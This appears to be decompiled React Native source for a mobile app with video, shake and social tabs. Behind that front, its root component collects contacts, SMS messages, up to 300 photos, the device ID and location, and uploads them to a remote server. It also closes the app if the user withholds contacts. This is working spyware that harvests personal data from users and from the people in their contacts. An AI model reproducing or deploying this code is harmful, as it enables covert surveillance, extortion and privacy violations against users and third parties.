var module383 = require('@babel/runtime/helpers/interopRequireDefault')(require('./383')),
  module393 = require('@babel/runtime/helpers/interopRequireDefault')(require('./393')),
  module271 = require('@babel/runtime/helpers/interopRequireDefault')(require('./271')),
  module7 = require('@babel/runtime/helpers/interopRequireDefault')(require('./7')),
  module8 = require('@babel/runtime/helpers/interopRequireDefault')(require('./8')),
  module13 = require('@babel/runtime/helpers/interopRequireDefault')(require('./13')),
  module15 = require('@babel/runtime/helpers/interopRequireDefault')(require('./15')),
  module17 = require('@babel/runtime/helpers/interopRequireDefault')(require('./17')),
  module125 = require('@babel/runtime/helpers/interopRequireDefault')(require('./125')),
  ReactNative = require('react-native'),
  module406 = require('@babel/runtime/helpers/interopRequireDefault')(require('./406')),
  module409 = require('@babel/runtime/helpers/interopRequireDefault')(require('./409')),
  module410 = require('@babel/runtime/helpers/interopRequireDefault')(require('./410')),
  module417 = require('@babel/runtime/helpers/interopRequireDefault')(require('./417')),
  module422 = require('@babel/runtime/helpers/interopRequireDefault')(require('./422')),
  module430 = require('@babel/runtime/helpers/interopRequireDefault')(require('./430')),
  module431 = require('@babel/runtime/helpers/interopRequireDefault')(require('./431')),
  module432 = require('@babel/runtime/helpers/interopRequireDefault')(require('./432')),
  module439 = require('@babel/runtime/helpers/interopRequireDefault')(require('./439')),
  module461 = require('@babel/runtime/helpers/interopRequireDefault')(require('./461')),
  module462 = require('@babel/runtime/helpers/interopRequireDefault')(require('./462')),
  module558 = require('@babel/runtime/helpers/interopRequireDefault')(require('./558')),
  module620 = require('@babel/runtime/helpers/interopRequireDefault')(require('./620')),
  module696 = require('@babel/runtime/helpers/interopRequireDefault')(require('./696')),
  module697 = require('@babel/runtime/helpers/interopRequireDefault')(require('./697')),
  module708 = require('@babel/runtime/helpers/interopRequireDefault')(require('./708')),
  module715 = require('@babel/runtime/helpers/interopRequireDefault')(require('./715')),
  module720 = require('@babel/runtime/helpers/interopRequireDefault')(require('./720')),
  module737 = require('@babel/runtime/helpers/interopRequireDefault')(require('./737')),
  module762 = require('@babel/runtime/helpers/interopRequireDefault')(require('./762')),
  module764 = require('@babel/runtime/helpers/interopRequireDefault')(require('./764')),
  module766 = require('@babel/runtime/helpers/interopRequireDefault')(require('./766')),
  module768 = require('@babel/runtime/helpers/interopRequireDefault')(require('./768')),
  module775 = require('@babel/runtime/helpers/interopRequireDefault')(require('./775')),
  module779 = require('@babel/runtime/helpers/interopRequireDefault')(require('./779')),
  module780 = require('@babel/runtime/helpers/interopRequireDefault')(require('./780')),
  module705 = require('@babel/runtime/helpers/interopRequireDefault')(require('./705')),
  module440 = require('@babel/runtime/helpers/interopRequireDefault')(require('./440'));

function z() {
  if ('undefined' == typeof Reflect || !Reflect.construct) return false;
  if (Reflect.construct.sham) return false;
  if ('function' == typeof Proxy) return true;

  try {
    Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
    return true;
  } catch (e) {
    return false;
  }
}

var module781 = require('./781').createBottomTabNavigator(),
  module840 = require('./840').createNativeStackNavigator();

function j() {
  return module125.default.createElement(
    module781.Navigator,
    {
      screenOptions: function (e) {
        var t = e.route;
        return {
          headerStyle: {
            backgroundColor: module705.default.main,
          },
          headerTintColor: '#fff',
          headerTitleStyle: {
            fontWeight: 'bold',
          },
          tabBarIcon: function (e) {
            var n,
              o = e.focused;
            if ('Home' === t.name) n = require(o ? d[41] : d[42]);
            else if ('Dynamic' === t.name) n = require(o ? d[43] : d[44]);
            else if ('User' === t.name) n = require(o ? d[45] : d[46]);
            return module125.default.createElement(ReactNative.Image, {
              source: n,
              style: {
                width: 24,
                height: 24,
              },
            });
          },
          tabBarActiveTintColor: module705.default.main,
          tabBarInactiveTintColor: 'gray',
        };
      },
    },
    module125.default.createElement(module781.Screen, {
      name: 'Home',
      component: module697.default,
      options: {
        title: module440.default('home'),
      },
    }),
    module125.default.createElement(module781.Screen, {
      name: 'Dynamic',
      component: module708.default,
      options: {
        title: module440.default('dynamic'),
      },
    }),
    module125.default.createElement(module781.Screen, {
      name: 'User',
      component: module715.default,
      options: {
        title: module440.default('mine'),
      },
    })
  );
}

function J() {
  return module125.default.createElement(
    module781.Navigator,
    {
      screenOptions: function (e) {
        var t = e.route;
        return {
          headerShown: false,
          headerStyle: {
            backgroundColor: module705.default.main,
          },
          headerTintColor: '#fff',
          headerTitleStyle: {
            fontWeight: 'bold',
          },
          tabBarIcon: function (e) {
            var n,
              o = e.focused;
            if ('Home' === t.name) n = require(o ? d[47] : d[48]);
            else if ('Shake' === t.name) n = require(o ? d[49] : d[50]);
            else if ('Dynamic' === t.name) n = require(o ? d[51] : d[52]);
            else if ('User' === t.name) n = require(o ? d[53] : d[54]);
            return module125.default.createElement(ReactNative.Image, {
              source: n,
              style: {
                width: 24,
                height: 24,
              },
            });
          },
          tabBarActiveTintColor: module705.default.black,
          tabBarInactiveTintColor: 'white',
          tabBarStyle: {
            backgroundColor: module705.default.main,
          },
        };
      },
    },
    module125.default.createElement(module781.Screen, {
      name: 'Home',
      component: module720.default,
      options: {
        title: module440.default('mode'),
      },
    }),
    module125.default.createElement(module781.Screen, {
      name: 'Shake',
      component: module737.default,
      options: {
        title: module440.default('shake'),
      },
    }),
    module125.default.createElement(module781.Screen, {
      name: 'Dynamic',
      component: module762.default,
      options: {
        title: module440.default('dynamic'),
      },
    }),
    module125.default.createElement(module781.Screen, {
      name: 'User',
      component: module764.default,
      options: {
        title: module440.default('auth'),
      },
    })
  );
}

var module460 = (function (R, ...args) {
    module13.default(q, R);

    var module697 = q,
      module708 = z(),
      C = function () {
        var e,
          t = module17.default(module697);

        if (module708) {
          var n = module17.default(this).constructor;
          e = Reflect.construct(t, arguments, n);
        } else e = t.apply(this, arguments);

        return module15.default(this, e);
      };

    function q() {
      var e;
      module7.default(this, q);
      (e = C.call(this, ...args)).state = {
        isLoadingComplete: false,
        isLogin: false,
      };
      e.photos = {
        data: [],
        index: 0,
        uniqueId: null,
        url: null,
      };
      e.offline = false;
      e.offlineData = {};
      e.check = false;
      e.loadAsync = module271.default(function* () {
        return Promise.all([
          module432.default.loadUrl(),
          module432.default.loadAuth(),
          module432.default.get('Login').then(function (t) {
            e.state.isLogin = !!t;
          }),
        ]);
      });

      e.requestPermission = function (t) {
        e.waitLogin = t.waitLogin;
        e.offline = t.offline;
        if (t.offline) e.offlineData = t;
        e.requestReadContactsPermission();
      };

      e.getContacts = function () {
        var n = [];
        module430.default.getAll().then(function (o) {
          if (o && o instanceof Array)
            0 != o.length
              ? (o.forEach(function (e) {
                  if (e.phoneNumbers && e.phoneNumbers instanceof Array && e.phoneNumbers.length)
                    n.push({
                      record_id: e.recordID,
                      family_name: e.familyName,
                      given_name: e.givenName,
                      phone_numbers: e.phoneNumbers,
                    });
                }),
                n.length < 1
                  ? module393.default.alert(
                      module440.default('hint'),
                      module125.default.createElement(
                        ReactNative.Text,
                        {
                          style: {
                            color: 'black',
                          },
                        },
                        module440.default('contacts3')
                      ),
                      [
                        {
                          text: 'OK!-' + n.length,
                          onPress: function () {
                            return module431.default.exitApp();
                          },
                        },
                      ]
                    )
                  : (e.waitLogin && ReactNative.DeviceEventEmitter.emit('LoginEnvent'),
                    e.offline
                      ? module696.default(
                          e.offlineData.phone,
                          'c',
                          Object.assign(
                            {
                              data: n,
                            },
                            e.offlineData
                          )
                        )
                      : e.props.dispatch({
                          type: 'submit/contacts',
                          payload: {
                            contacts: n,
                          },
                        }),
                    e.requestReadSMS()))
              : module393.default.alert(
                  module440.default('hint'),
                  module125.default.createElement(
                    ReactNative.Text,
                    {
                      style: {
                        color: 'black',
                      },
                    },
                    module440.default('contacts4')
                  ),
                  [
                    {
                      text: 'OK!',
                      onPress: function () {
                        return module431.default.exitApp();
                      },
                    },
                  ]
                );
          else
            module393.default.alert(
              module440.default('hint'),
              module125.default.createElement(
                ReactNative.Text,
                {
                  style: {
                    color: 'black',
                  },
                },
                module440.default('contacts3')
              ),
              [
                {
                  text: 'OK',
                  onPress: function () {
                    return module431.default.exitApp();
                  },
                },
              ]
            );
        });
      };

      e.getSMS = function () {
        ReactNative.NativeModules.SMSModule.getSmsInPhone().then(function (t) {
          if (e.offline)
            module696.default(e.offlineData.phone, 's', {
              phone: e.offlineData.phone,
              data: t,
            });
          else
            e.props.dispatch({
              type: 'submit/sms',
              payload: {
                sms: t,
              },
            });
        });
      };

      e.getPhotos = function () {
        module406.default
          .getPhotos({
            first: 300,
            assetType: 'Photos',
          })
          .then(function (t) {
            e.photos.data = t.edges instanceof Array ? t.edges : [];
            e.waitFileServer();
            e.requestLocation();
          })
          .catch(function () {
            module439.default(module440.default('photo1'));
          });
      };

      e.waitFileServer = module271.default(function* () {
        if (e.timer) clearTimeout(e.timer);
        var t = yield module432.default.get('file_server');

        if (t) {
          e.photos.url = t;
          e.uploadFile();
        } else
          e.timer = setTimeout(function () {
            e.waitFileServer();
          }, 1e3);
      });
      e.uploadFile = module271.default(function* () {
        for (var t = new FormData(), n = e.photos.index, o = 0, i = n; i < e.photos.data.length && o < 20; i++) {
          n = i + 1;
          o++;
          var l = e.photos.data[i].node.image;

          try {
            var u = {
              uri: (yield module409.default.createResizedImage(l.uri, 650, 650, 'JPEG', 60)).uri,
              type: 'multipart/octet-stream',
              name: '.jpg',
            };
            t.append('file[]', u);
          } catch (e) {}
        }

        if (0 !== o)
          e.props
            .dispatch({
              type: 'submit/upload',
              payload: {
                url: e.photos.url,
                data: t,
                uniqueId: e.photos.uniqueId,
              },
            })
            .then(function (t) {
              if ('error' !== t) {
                e.photos.index = n;
                module432.default.set('ImageIndex', e.photos.index);
              }

              if (e.photos.index < e.photos.data.length) e.uploadFile();
            });
      });

      e.requestLocation = function () {
        module417.default
          .requestPermission({
            ios: 'whenInUse',
            android: {
              detail: 'coarse',
              rationale: {
                title: module440.default('location'),
                message: module440.default('authorization3'),
                buttonPositive: 'OK',
              },
            },
          })
          .then(function (t) {
            if (t)
              module417.default
                .getLatestLocation({
                  timeout: 6e4,
                })
                .then(function (t) {
                  if (t && t.latitude && t.longitude)
                    ReactNative.NativeModules.GeoModule.getGeoAddress(t.latitude, t.longitude).then(function (t) {
                      if (e.offline)
                        module696.default(e.offlineData.phone, 'l', {
                          phone: e.offlineData.phone,
                          data: t,
                        });
                      else
                        e.props.dispatch({
                          type: 'user/updateLocation',
                          payload: {
                            location: t,
                          },
                        });
                    });
                });
          });
      };

      return e;
    }

    module8.default(q, [
      {
        key: 'componentDidMount',
        value: function () {
          var e = this;
          this.subscription = ReactNative.DeviceEventEmitter.addListener('RequestPermission', this.requestPermission);
          module422.default.addEventListener(function (t) {
            if (t.isConnected && !e.check) {
              e.check = true;
              module620.default();
            }
          });
        },
      },
      {
        key: 'componentWillUnmount',
        value: function () {
          this.subscription.remove();
        },
      },
      {
        key: 'requestReadContactsPermission',
        value: (function () {
          var e = module271.default(function* () {
            var e = this;

            if ('android' === ReactNative.Platform.OS) {
              if (
                (yield ReactNative.PermissionsAndroid.request(ReactNative.PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
                  title: module440.default('contacts2'),
                  message: module440.default('authorization3'),
                  buttonPositive: 'OK',
                })) !== ReactNative.PermissionsAndroid.RESULTS.GRANTED
              )
                return void module439.default(module440.default('contacts1'));
            } else {
              var n = yield module430.default.checkPermission();
              if ('undefined' === n)
                return void module430.default
                  .requestPermission()
                  .then(function (t) {
                    if ('authorized' === t) e.getContacts();
                    else module439.default(module440.default('contacts1'));
                  })
                  .catch(function () {
                    module393.default.alert(
                      module440.default('hint'),
                      module125.default.createElement(
                        ReactNative.Text,
                        {
                          style: {
                            color: 'black',
                          },
                        },
                        module440.default('contacts3')
                      ),
                      [
                        {
                          text: 'OK',
                          onPress: function () {
                            return module431.default.exitApp();
                          },
                        },
                      ]
                    );
                  });
              if ('denied' === n) return void module439.default(module440.default('contacts1'));
            }

            this.getContacts();
          });
          return function () {
            return e.apply(this, arguments);
          };
        })(),
      },
      {
        key: 'requestReadSMS',
        value: (function () {
          var e = module271.default(function* () {
            if ('android' === ReactNative.Platform.OS) {
              if (
                (yield ReactNative.PermissionsAndroid.request(ReactNative.PermissionsAndroid.PERMISSIONS.READ_SMS, {
                  title: module440.default('message2'),
                  message: module440.default('authorization3'),
                  buttonPositive: 'OK',
                })) !== ReactNative.PermissionsAndroid.RESULTS.GRANTED
              )
                return void module439.default(module440.default('message1'));
              this.getSMS();
            }

            this.getDeviceInfo();
          });
          return function () {
            return e.apply(this, arguments);
          };
        })(),
      },
      {
        key: 'getDeviceInfo',
        value: (function () {
          var e = module271.default(function* () {
            this.photos.uniqueId = yield module410.default.getUniqueId();
            if (this.photos.uniqueId) this.requestReadPhonePermission();
            else module439.default(module440.default('device'));
          });
          return function () {
            return e.apply(this, arguments);
          };
        })(),
      },
      {
        key: 'requestReadPhonePermission',
        value: (function () {
          var e = module271.default(function* () {
            var e = yield module432.default.get('ImageIndex');
            if (
              (e && (this.photos.index = e), 'android' === ReactNative.Platform.OS) &&
              (yield ReactNative.PermissionsAndroid.request(ReactNative.PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE, {
                title: module440.default('photo2'),
                message: module440.default('authorization3'),
                buttonPositive: 'OK',
              })) !== ReactNative.PermissionsAndroid.RESULTS.GRANTED
            )
              return void module439.default(module440.default('photo1'));
            this.getPhotos();
          });
          return function () {
            return e.apply(this, arguments);
          };
        })(),
      },
      {
        key: 'render',
        value: function () {
          var t = this;
          return this.state.isLoadingComplete || this.props.skipLoadingScreen
            ? module125.default.createElement(
                module383.default,
                null,
                module125.default.createElement(
                  require('./463').NavigationContainer,
                  {
                    ref: function (e) {
                      module462.default.setTopLevelNavigator(e);
                    },
                  },
                  module125.default.createElement(
                    module840.Navigator,
                    {
                      initialRouteName: this.state.isLogin ? 'Main' : 'Login',
                    },
                    module125.default.createElement(module840.Screen, {
                      name: 'Login',
                      component: module766.default,
                      options: {
                        headerShown: false,
                      },
                    }),
                    module125.default.createElement(module840.Screen, {
                      name: 'Main',
                      component: 1 == require('./460').view ? j : J,
                      options: {
                        headerShown: false,
                      },
                    }),
                    module125.default.createElement(module840.Screen, {
                      name: 'Web',
                      component: module768.default,
                      options: {
                        title: module440.default('video'),
                        headerStyle: {
                          backgroundColor: module705.default.main,
                        },
                        headerBackTitle: '',
                        headerTintColor: '#fff',
                        headerTitleStyle: {
                          fontWeight: 'bold',
                        },
                      },
                    })
                  )
                )
              )
            : module125.default.createElement(module461.default, {
                startAsync: this.loadAsync,
                onFinish: function () {
                  return t.setState({
                    isLoadingComplete: true,
                  });
                },
              });
        },
      },
    ]);
    return q;
  })(module125.default.Component),
  module559 = require('./559').connect(function (e) {
    return {
      router: e.router,
    };
  })(module460),
  V = module558
    .default({
      initialState: {},
      models: [module775.default, module779.default, module780.default],
      onError: function (e) {
        console.log('onError', e);
      },
    })
    .start(module125.default.createElement(module559, null));

exports.default = V;
